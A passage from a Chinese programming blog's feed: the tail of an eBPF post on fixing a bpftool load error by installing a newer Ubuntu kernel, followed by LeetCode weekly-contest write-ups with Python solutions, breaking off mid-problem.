title="加载bpf字节码出错"></a>加载bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ~/linux-4.18.13/tools/bpf/bpftool/./bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">libbpf: Program '"sockops"' contains non-map related relo data pointing to section 5</span><br><span class="line">Error: failed to load program</span><br></pre></td></tr></table></figure><p>问题google后发现，可能是低内核版本不支持bpf程序静态全局变量的定义，</p><p><a href="https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs" target="_blank" rel="noopener">https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs</a></p><h5 id="安装指定版本的Linux内核"><a href="#安装指定版本的Linux内核" class="headerlink" title="安装指定版本的Linux内核"></a>安装指定版本的Linux内核</h5><h6 id="查询当前内核版本"><a href="#查询当前内核版本" class="headerlink" title="查询当前内核版本"></a>查询当前内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">4.18.0-13-generic</span><br></pre></td></tr></table></figure><h6 id="查询当前安装的内核镜像"><a href="#查询当前安装的内核镜像" class="headerlink" title="查询当前安装的内核镜像"></a>查询当前安装的内核镜像</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ dpkg --get-selections |grep linux-image</span><br><span class="line">linux-image-4.15.0-162-genericinstall</span><br><span class="line">linux-image-4.15.0-55-genericdeinstall</span><br><span class="line">linux-image-4.18.0-13-genericinstall</span><br><span class="line">linux-image-genericinstall</span><br></pre></td></tr></table></figure><h6 id="查询指定版本的Linux镜像包"><a href="#查询指定版本的Linux镜像包" class="headerlink" title="查询指定版本的Linux镜像包"></a>查询指定版本的Linux镜像包</h6><p>这里以<code>5.3.0-40</code>版本内核为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ apt-cache search linux| grep 5.3.0-40</span><br><span class="line">linux-buildinfo-5.3.0-40-generic - Linux kernel buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-buildinfo-5.3.0-40-lowlatency - Linux kernel buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-cloud-tools-5.3.0-40-generic - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-cloud-tools-5.3.0-40-lowlatency - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-headers-5.3.0-40 - Header files related to Linux kernel version 5.3.0</span><br><span class="line">linux-headers-5.3.0-40-generic - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-headers-5.3.0-40-lowlatency - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-hwe-cloud-tools-5.3.0-40 - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-hwe-tools-5.3.0-40 - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-image-5.3.0-40-generic - Signed kernel image generic</span><br><span class="line">linux-image-5.3.0-40-lowlatency - Signed kernel image lowlatency</span><br><span class="line">linux-image-unsigned-5.3.0-40-generic - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-5.3.0-40-lowlatency - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-lowlatency - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-extra-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-tools-5.3.0-40-generic - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-tools-5.3.0-40-lowlatency - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-generic - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-lowlatency - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br></pre></td></tr></table></figure><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-5.3.0-40-generic linux-image-5.3.0-40-generic</span><br></pre></td></tr></table></figure><h6 id="重启后查询内核版本"><a href="#重启后查询内核版本" class="headerlink" title="重启后查询内核版本"></a>重启后查询内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">5.3.0-40-generic</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://ebpf.io/what-is-ebpf/" target="_blank" rel="noopener">https://ebpf.io/what-is-ebpf/</a></li><li><a href="https://www.dazhuanlan.com/lganlan/topics/1072521" target="_blank" rel="noopener">https://www.dazhuanlan.com/lganlan/topics/1072521</a></li><li><a href="https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/</a></li><li><a href="https://jishuin.proginn.com/p/763bfbd6368e" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd6368e</a></li><li><a href="https://forsworns.github.io/zh/blogs/20210311/" target="_blank" rel="noopener">https://forsworns.github.io/zh/blogs/20210311/</a></li><li><a href="http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/" target="_blank" rel="noopener">http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/</a></li><li><a href="https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/" target="_blank" rel="noopener">https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。&lt;/p&gt;
&lt;h4 id=&quot;BPF发展史&quot;&gt;&lt;a href=&quot;#BP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第276场周赛write up</title>
    <link href="elssm.github.io/2022/01/16/Leetcode%E7%AC%AC276%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/16/Leetcode第276场周赛write-up/</id>
    <published>2022-01-16T06:00:39.000Z</published>
    <updated>2022-01-16T06:20:12.246Z</updated>
    
    <content type="html"><![CDATA[<h4 id="将字符串拆分为若干长度为-k-的组"><a href="#将字符串拆分为若干长度为-k-的组" class="headerlink" title="将字符串拆分为若干长度为 k 的组"></a>将字符串拆分为若干长度为 k 的组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串 s 可以按下述步骤划分为若干长度为 k 的组：</span><br><span class="line">第一组由字符串中的前 k 个字符组成，第二组由接下来的 k 个字符串组成，依此类推。每个字符都能够成为 某一个 组的一部分。</span><br><span class="line">对于最后一组，如果字符串剩下的字符 不足 k 个，需使用字符 fill 来补全这一组字符。</span><br><span class="line">注意，在去除最后一个组的填充字符 fill（如果存在的话）并按顺序连接所有的组后，所得到的字符串应该是 s 。</span><br><span class="line">给你一个字符串 s ，以及每组的长度 k 和一个用于填充的字符 fill ，按上述步骤处理之后，返回一个字符串数组，该数组表示 s 分组后 每个组的组成情况 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghi&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">解释：</span><br><span class="line">前 3 个字符是 &quot;abc&quot; ，形成第一组。</span><br><span class="line">接下来 3 个字符是 &quot;def&quot; ，形成第二组。</span><br><span class="line">最后 3 个字符是 &quot;ghi&quot; ，形成第三组。</span><br><span class="line">由于所有组都可以由字符串中的字符完全填充，所以不需要使用填充字符。</span><br><span class="line">因此，形成 3 组，分别是 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghij&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;,&quot;jxx&quot;]</span><br><span class="line">解释：</span><br><span class="line">与前一个例子类似，形成前三组 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br><span class="line">对于最后一组，字符串中仅剩下字符 &apos;j&apos; 可以用。为了补全这一组，使用填充字符 &apos;x&apos; 两次。</span><br><span class="line">因此，形成 4 组，分别是 &quot;abc&quot;、&quot;def&quot;、&quot;ghi&quot; 和 &quot;jxx&quot; 。</span><br></pre></td></tr></table></figure><p>常规题，先分割，再填补。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">divideString</span><span class="params">(self, s, k, fill)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :type fill: str</span></span><br><span class="line"><span class="string">        :rtype: List[str]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span> len(s)&gt;=k:</span><br><span class="line">            t = s[:k]</span><br><span class="line">            s = s[k:]</span><br><span class="line">            res.append(t)</span><br><span class="line">        <span class="keyword">if</span> len(s)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-len(s)):</span><br><span class="line">                s+=fill</span><br><span class="line">            res.append(s)</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="得到目标值的最少行动次数"><a href="#得到目标值的最少行动次数" class="headerlink" title="得到目标值的最少行动次数"></a>得到目标值的最少行动次数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你正在玩一个整数游戏。从整数 1 开始，期望得到整数 target 。</span><br><span class="line">在一次行动中，你可以做下述两种操作之一：</span><br><span class="line">递增，将当前整数的值加 1（即， x = x + 1）。</span><br><span class="line">加倍，使当前整数的值翻倍（即，x = 2 * x）。</span><br><span class="line">在整个游戏过程中，你可以使用 递增 操作 任意 次数。但是只能使用 加倍 操作 至多 maxDoubles 次。</span><br><span class="line">给你两个整数 target 和 maxDoubles ，返回从 1 开始得到 target 需要的最少行动次数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 5, maxDoubles = 0</span><br><span class="line">输出：4</span><br><span class="line">解释：一直递增 1 直到得到 target 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 19, maxDoubles = 2</span><br><span class="line">输出：7</span><br><span class="line">解释：最初，x = 1 。</span><br><span class="line">递增 3 次，x = 4 。</span><br><span class="line">加倍 1 次，x = 8 。</span><br><span class="line">递增 1 次，x = 9 。</span><br><span class="line">加倍 1 次，x = 18 。</span><br><span class="line">递增 1 次，x = 19 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 10, maxDoubles = 4</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">最初，x = 1 。 </span><br><span class="line">递增 1 次，x = 2 。 </span><br><span class="line">加倍 1 次，x = 4 。 </span><br><span class="line">递增 1 次，x = 5 。 </span><br><span class="line">加倍 1 次，x = 10 。</span><br></pre></td></tr></table></figure><p>这道题我们首先能想到的是，尽可能多的使用“加倍”操作。既然是从1开始，我们就想办法让输入变为1即可。在操作的过程中，我们需要考虑两种情况：当前值是奇数还是偶数。<br>如果是奇数，我们需要让他变成偶数，方便我们的“除2”操作。因此给当前数减去1即可<br>如果是偶数，我们又需要考虑两种情况。是否可以进行”除2“操作。<br>也就是我们需要对<code>maxDoubles</code>的值进行判断。<br>如果<code>maxDoubles</code>大于零，那我们正常进行除法操作即可。<br>如果<code>maxDoubles</code>已经变为零，那我们也不需要一个一个的递减了，直接变为1即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minMoves</span><span class="params">(self, target, maxDoubles)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :type maxDoubles: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> target != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> target % <span class="number">2</span>:</span><br><span class="line">                target -= <span class="number">1</span></span><br><span class="line">                count +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> maxDoubles&gt;<span class="number">0</span>:</span><br><span class="line">                    target /=<span class="number">2</span></span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    maxDoubles -=<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    count+=target<span class="number">-1</span></span><br><span class="line">                    target = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h4 id="解决智力问题"><a href="#解决智力问题" class="headerlink" title="解决智力问题"></a>解决智力问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从0开始的二维整数数组 questions ，其中 questions[i] = [pointsi, brainpoweri]。</span><br><span class="line">这个数组表示一场考试里的一系列题目，你需要 按顺序 （也就是从问题 0 开始依次解决），针对每个问题选择 解决 或者 跳过 操作。解决问题 i 将让你 获得  pointsi 的分数，但是你将 无法 解决接下来的 brainpoweri 个问题（即只能跳过接下来的 brainpoweri 个问题）。如果你跳过问题 i ，你可以对下一个问题决定使用哪种操作。</span><br><span class="line">比方说，给你 questions = [[3, 2], [4, 3], [4, 4], [2, 5]] ：</span><br><span class="line">如果问题 0 被解决了， 那么你可以获得 3 分，但你不能解决问题 1 和 2 。</span><br><span class="line">如果你跳过问题 0 ，且解决问题 1 ，你将获得 4 分但是不能解决问题 2 和 3 。</span><br><span class="line">请你返回这场考试里你能获得的 最高 分数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[3,2],[4,3],[4,4],[2,5]]</span><br><span class="line">输出：5</span><br><span class="line">解释：解决问题 0 和 3 得到最高分。</span><br><span class="line">- 解决问题 0 ：获得 3 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 1 和 2</span><br><span class="line">- 解决问题 3 ：获得 2 分</span><br><span class="line">总得分为：3 + 2 = 5 。没有别的办法获得 5 分或者多于 5 分。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[1,1],[2,2],[3,3],[4,4],[5,5]]</span><br><span class="line">输出：7</span><br><span class="line">解释：解决问题 1 和 4 得到最高分。</span><br><span class="line">- 跳过问题 0</span><br><span class="line">- 解决问题 1 ：获得 2 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 2 和 3</span><br><span class="line">- 解决问题 4 ：获得 5 分</span><br><span class="line">总得分为：2 + 5 = 7 。没有别的办法获得 7 分或者多于 7 分。</span><br></pre></td></tr></table></figure><p>这道题需要反向动态规划，即当前值的最大值是根据后面的值来得出的，因此我们先计算后面的值！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mostPoints</span><span class="params">(self, questions)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type questions: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(questions)+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(questions)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            <span class="comment">#如果当前位置加上brainpower没有超出数组长度</span></span><br><span class="line">            <span class="keyword">if</span> i+questions[i][<span class="number">1</span>] &lt; len(questions):</span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                1.做这道题+做下一跳题的得分和</span></span><br><span class="line"><span class="string">                2.不做这道题，做下一题的得分</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                dp[i] = max(questions[i][<span class="number">0</span>] + dp[i + questions[i][<span class="number">1</span>] + <span class="number">1</span>],dp[i + <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment">#如果当前位置加上brainpower已经超出数组长度</span></span><br><span class="line">                <span class="comment">#当前位置的值是当前值的得分和下一个位置所得分之间的较大值</span></span><br><span class="line">                dp[i] = max(dp[i+<span class="number">1</span>],questions[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;将字符串拆分为若干长度为-k-的组&quot;&gt;&lt;a href=&quot;#将字符串拆分为若干长度为-k-的组&quot; class=&quot;headerlink&quot; title=&quot;将字符串拆分为若干长度为 k 的组&quot;&gt;&lt;/a&gt;将字符串拆分为若干长度为 k 的组&lt;/h4&gt;&lt;figure class
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第274场周赛write up</title>
    <link href="elssm.github.io/2022/01/02/Leetcode%E7%AC%AC274%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/02/Leetcode第274场周赛write-up/</id>
    <published>2022-01-02T09:07:07.000Z</published>
    <updated>2022-01-02T09:19:33.780Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>老三样如约而至。。。。</p><h4 id="检查是否所有-A-都在-B-之前"><a href="#检查是否所有-A-都在-B-之前" class="headerlink" title="检查是否所有 A 都在 B 之前"></a>检查是否所有 A 都在 B 之前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你一个 仅 由字符 &apos;a&apos; 和 &apos;b&apos; 组成的字符串  s 。如果字符串中 每个 &apos;a&apos; 都出现在 每个 &apos;b&apos; 之前，返回 true ；否则，返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aaabbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">&apos;a&apos; 位于下标 0、1 和 2 ；而 &apos;b&apos; 位于下标 3、4 和 5 。</span><br><span class="line">因此，每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abab&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">存在一个 &apos;a&apos; 位于下标 2 ，而一个 &apos;b&apos; 位于下标 1 。</span><br><span class="line">因此，不能满足每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 false</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;bbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">不存在 &apos;a&apos; ，因此可以视作每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><p>There’s nothing to say，第一道题面前重拳出击！🐶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkString</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'a'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        index_b = s.index(<span class="string">'b'</span>)</span><br><span class="line">        <span class="keyword">if</span> count &lt;= index_b:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="银行中的激光束数量"><a href="#银行中的激光束数量" class="headerlink" title="银行中的激光束数量"></a>银行中的激光束数量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">银行内部的防盗安全装置已经激活。给你一个下标从 0 开始的二进制字符串数组 bank ，表示银行的平面图，这是一个大小为 m x n 的二维矩阵。 bank[i] 表示第 i 行的设备分布，由若干 &apos;0&apos; 和若干 &apos;1&apos; 组成。&apos;0&apos; 表示单元格是空的，而 &apos;1&apos; 表示单元格有一个安全设备。</span><br><span class="line">对任意两个安全设备而言，如果同时 满足下面两个条件，则二者之间存在 一个 激光束：</span><br><span class="line">两个设备位于两个 不同行 ：r1 和 r2 ，其中 r1 &lt; r2 。</span><br><span class="line">满足 r1 &lt; i &lt; r2 的 所有 行 i ，都 没有安全设备 。</span><br><span class="line">激光束是独立的，也就是说，一个激光束既不会干扰另一个激光束，也不会与另一个激光束合并成一束。</span><br><span class="line">返回银行中激光束的总数量。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;011001&quot;,&quot;000000&quot;,&quot;010100&quot;,&quot;001000&quot;]</span><br><span class="line">输出：8</span><br><span class="line">解释：在下面每组设备对之间，存在一条激光束。总共是 8 条激光束：</span><br><span class="line"> * bank[0][1] -- bank[2][1]</span><br><span class="line"> * bank[0][1] -- bank[2][3]</span><br><span class="line"> * bank[0][2] -- bank[2][1]</span><br><span class="line"> * bank[0][2] -- bank[2][3]</span><br><span class="line"> * bank[0][5] -- bank[2][1]</span><br><span class="line"> * bank[0][5] -- bank[2][3]</span><br><span class="line"> * bank[2][1] -- bank[3][2]</span><br><span class="line"> * bank[2][3] -- bank[3][2]</span><br><span class="line">注意，第 0 